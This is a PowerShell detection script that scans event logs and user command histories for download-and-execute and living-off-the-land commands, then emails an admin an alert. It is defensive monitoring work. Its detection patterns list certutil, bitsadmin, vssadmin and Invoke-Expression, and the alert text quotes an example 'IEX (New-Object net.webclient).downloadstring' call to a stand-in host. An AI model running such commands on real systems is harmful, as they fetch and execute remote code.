<#
.Synopsis
    Trace-PowerShellAttack is a cmdlet created for Task Scheduler to find malicious commands executed in PowerShell.
    I suggest having it run once every 15 minutes to keep alerts somewhat live.
    
.DESCRIPTION
    The Trace-PowerShellAttack cmdlet looks at executed commands and alerts an admin by email if the command matches a common attack.
    The attacker command doesn't have to be successful it just has to be executed.

.NOTES
    Author: Rob Osborne 
    Alias: tobor
    Contact: rosborne@osbornepro.com
    https://roberthosborne.com

.EXAMPLE
   Trace-PowerShellAttack

.EXAMPLE
   Trace-PowerShellAttack -Verbose
#>

Function Trace-PowerShellAttack {
    [CmdletBinding()]
        param() # End param

$Css = @"
<style>
table {
    font-family: verdana,arial,sans-serif;
        font-size:11px;
        color:#333333;
        border-width: 1px;
        border-color: #666666;
        border-collapse: collapse;
}
th {
        border-width: 1px;
        padding: 8px;
        border-style: solid;
        border-color: #666666;
        background-color: #dedede;
}
td {
        border-width: 1px;
        padding: 8px;
        border-style: solid;
        border-color: #666666;
        background-color: #ffffff;
}
</style>
"@
    
    $FromEmail = "from@osbornepro.com"
    $SmtpServer = "smtpserver.com"
    $Computer = $env:COMPUTERNAME

    Write-Verbose "Pulling events in search of possibly malicious commands."
    
    [array]$BadEvent = Get-WinEvent -FilterHashtable @{logname="Windows PowerShell"; id=800} -MaxEvents 100 | Where-Object { ($_.Message -like "*Pipeline execution details for command line:*IEX*") -or ($_.Message -like "*Pipeline execution details for command line:*certutil") -or ($_.Message -like "*Pipeline execution details for command line:*bitsadmin*") -or ($_.Message -like "*Pipeline execution details for command line:*Start-BitsTransfer*") -or ($_.Message -like "*Pipeline execution details for command line:*vssadmin*") -or ($_.Message -like "*Pipeline execution details for command line:*Invoke-Expression*") }

    If (($BadEvent.Properties.Item(0) | Select-Object -ExpandProperty 'Value' | Out-String) -like "IEX*") {$EventInfo = $BadEvent}
    Elseif (($BadEvent.Properties.Item(0) | Select-Object -ExpandProperty 'Value' | Out-String) -like "Invoke-Expression*") {$EventInfo = $BadEvent}
    Elseif (($BadEvent.Properties.Item(0) | Select-Object -ExpandProperty 'Value' | Out-String) -like "certutil*") {$EventInfo = $BadEvent}
    Elseif (($BadEvent.Properties.Item(0) | Select-Object -ExpandProperty 'Value' | Out-String) -like "bitsadmin*") {$EventInfo = $BadEvent}
    Elseif (($BadEvent.Properties.Item(0) | Select-Object -ExpandProperty 'Value' | Out-String) -like "Start-BitsTransfer*") {$EventInfo = $BadEvent}

    $More = $EventInfo.Properties.Item(0)

    [array]$UserList = Get-ChildItem -Path 'C:\Users' | Select-Object -ExpandProperty 'Name'

    [array]$Check = @()

    Write-Verbose "Checking history file for the commands used..."

    ForEach ($User in $UserList)
    {

        $HistoryFile = "C:\Users\$User\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"

        $Check += Get-Content -Path $HistoryFile | Select-String -SimpleMatch "IEX(New-Object Net.WebClient).downloadString("
        $Check += Get-Content -Path $HistoryFile | Select-String -SimpleMatch "IEX (New-Object Net.WebClient).downloadString("
        $Check += Get-Content -Path $HistoryFile | Select-String -SimpleMatch "Invoke-Expression"
        $Check += Get-Content -Path $HistoryFile | Select-String -SimpleMatch "certutil"
        $Check += Get-Content -Path $HistoryFile | Select-String -SimpleMatch "vssadmin"
        $Check += Get-Content -Path $HistoryFile | Select-String -SimpleMatch "bitsadmin"
        $Check += Get-Content -Path $HistoryFile | Select-String -SimpleMatch "Start-BitsTransfer"

    } # End ForEach

    If ( ($More.Value -like "*IEX (New-Object net.webclient).downloadstring(*") -or ($More.Value -like "Certutil*-f*") -or ($More.Value -like "vssadmin*") -or ($More.Value -like "bitsadmin*") -or ($More.Value -like "Start-BitsTransfer*") )
     {

        $TableInfo = $EventInfo | Select-Object -Property 'MachineName', 'Message' 
        $PreContent = "<Title>PowerShell RCE Monitoring Alert: Watches for Malicious Commands</Title>"
        $NoteLine = "$(Get-Date -format 'MM/dd/yyyy HH:mm:ss')"
        $PostContent = "<br><p><font size='2'><i>$NoteLine</i></font>"

        $MailBody = $TableInfo | ConvertTo-Html -Head $Css -PostContent $PostContent -PreContent $PreContent -Body "If command is like 'IEX (New-Object net.webclient).downloadstring('http://10.0.0.1:8000/Something.ps1')'; an attacker is using an HTTP Server to try to run commands on our network devices. The http site is possily the attackers machine. If the command uses bitsadmin or certutil -urlcache -split -f the attacker is trying to download files to the device." | Out-String
        $MailBody += "This is the command that was issued:    "
        $MailBody += $More.Value
        $MailBody += "`n`nCommands found in PowerShell History: `n`n$Check"

        Send-MailMessage -From $FromEmail -To $FromEmail -Subject "Possible PowerShell Attack on $Computer" -BodyAsHtml -Body $MailBody -SmtpServer $SmtpServer

    } # End If


} # End Function


